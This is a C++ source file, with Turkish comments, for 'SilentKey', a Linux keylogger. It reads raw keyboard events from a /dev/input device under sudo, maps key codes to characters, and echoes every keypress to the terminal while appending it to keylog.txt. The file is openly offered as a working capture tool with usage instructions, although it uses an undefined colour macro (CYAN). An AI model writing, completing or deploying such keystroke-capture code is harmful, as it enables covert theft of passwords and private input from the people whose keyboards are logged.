#include <iostream>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <map>
#include <fstream>
#include <string>

// Renkler
#define RED "\033[1;31m"
#define GREEN "\033[1;32m"
#define YELLOW "\033[1;33m"
#define RESET "\033[0m"

using namespace std;

// Basit Tuş Haritası (Geliştirilebilir)
map<int, string> keyMap = {
    {1, "[ESC]"}, {2, "1"}, {3, "2"}, {4, "3"}, {5, "4"}, {6, "5"}, {7, "6"}, {8, "7"}, {9, "8"}, {10, "9"}, {11, "0"},
    {12, "-"}, {13, "="}, {14, "[BACKSPACE]"}, {15, "[TAB]"},
    {16, "q"}, {17, "w"}, {18, "e"}, {19, "r"}, {20, "t"}, {21, "y"}, {22, "u"}, {23, "i"}, {24, "o"}, {25, "p"},
    {26, "["}, {27, "]"}, {28, "\n"}, {29, "[CTRL]"},
    {30, "a"}, {31, "s"}, {32, "d"}, {33, "f"}, {34, "g"}, {35, "h"}, {36, "j"}, {37, "k"}, {38, "l"},
    {39, ";"}, {40, "'"}, {42, "[SHIFT]"}, {43, "\\"},
    {44, "z"}, {45, "x"}, {46, "c"}, {47, "v"}, {48, "b"}, {49, "n"}, {50, "m"},
    {51, ","}, {52, "."}, {53, "/"}, {54, "[SHIFT]"}, {57, " "}, {58, "[CAPSLOCK]"},
    {105, "[LEFT]"}, {106, "[RIGHT]"}, {103, "[UP]"}, {108, "[DOWN]"}
};

void startLogging(const char* devicePath) {
    // Aygıt dosyasını sadece okuma modunda aç
    int fd = open(devicePath, O_RDONLY);
    if (fd == -1) {
        cerr << RED << "[!] Hata: Klavye aygıtı açılamadı (" << devicePath << ")" << RESET << endl;
        cerr << YELLOW << "[?] İpucu: 'sudo' ile çalıştırmayı denedin mi?" << RESET << endl;
        return;
    }

    // Log dosyasını ekleme (append) modunda aç
    ofstream logFile("keylog.txt", ios::app);
    if (!logFile.is_open()) {
        cerr << RED << "[!] Hata: Log dosyası oluşturulamadı." << RESET << endl;
        close(fd);
        return;
    }

    cout << GREEN << "[*] SilentKey Başlatıldı." << RESET << endl;
    cout << CYAN << "[*] Hedef: " << devicePath << RESET << endl;
    cout << YELLOW << "[*] Loglar 'keylog.txt' dosyasına kaydediliyor... (Durdurmak için CTRL+C)" << RESET << endl;

    struct input_event ev;
    
    // Sonsuz döngü: Klavye olaylarını dinle
    while (true) {
        ssize_t bytes = read(fd, &ev, sizeof(struct input_event));
        
        if (bytes < (ssize_t)sizeof(struct input_event)) {
            perror("[!] Okuma hatası");
            break;
        }

        // EV_KEY = Tuş olayı, ev.value 1 = Tuşa basıldı (0 bırakıldı, 2 basılı tutuluyor)
        if (ev.type == EV_KEY && ev.value == 1) {
            if (keyMap.count(ev.code)) {
                string key = keyMap[ev.code];
                cout << key << flush; // Terminale yaz (Canlı izleme)
                logFile << key << flush; // Dosyaya kaydet
            } else {
                // Haritada olmayan tuşları kod olarak kaydet
                // logFile << "[UNK:" << ev.code << "]";
            }
        }
    }

    close(fd);
    logFile.close();
}

int main(int argc, char* argv[]) {
    cout << R"(
   _____ __               __ __ __          
  / ___// /_/__  ____  / //_// /__  __  __
  \__ \/ __/ _ \/ __ \/ ,<  / //_ \/ / / /
 ___/ / /_/  __/ / / / /| |/ /  / / /_/ / 
/____/\__/\___/_/ /_/_/ |_/_/  /_/\__, /  
                                 /____/   
    )" << endl;

    if (argc != 2) {
        cout << "Kullanım: sudo ./silentkey <device_path>" << endl;
        cout << "Örnek: sudo ./silentkey /dev/input/event3" << endl;
        return 1;
    }

    startLogging(argv[1]);
    return 0;
}
